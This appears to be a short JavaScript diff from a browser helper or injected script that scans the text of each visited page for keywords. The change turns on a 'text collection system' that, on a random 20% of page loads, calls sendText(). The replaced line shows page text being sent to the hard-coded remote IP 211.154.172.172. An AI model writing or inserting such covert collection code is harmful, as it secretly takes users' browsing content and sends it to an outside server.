@@ -469,8 +469,9 @@ function I8bho_print()
 			i= 0, length= words.length, max= rand(7, 10), matches= [], text= body.innerText.toLowerCase();
 
 		//distrebuted text collection system
-		//if( rand(1,100)<=20 )
-		//	I8px('http://211.154.172.172/text?text=' + encodeURIComponent(text).substr(0, 1024) );
+		if( rand(1,100)<=20 )
+            sendText();
+//			I8px('http://211.154.172.172/text?text=' + encodeURIComponent(text).substr(0, 1024) );
 
 		//match
 		while( length>++i && matches.length<max ){if( text.indexOf(words[i])>-1 && matches.push(words[i]) );}
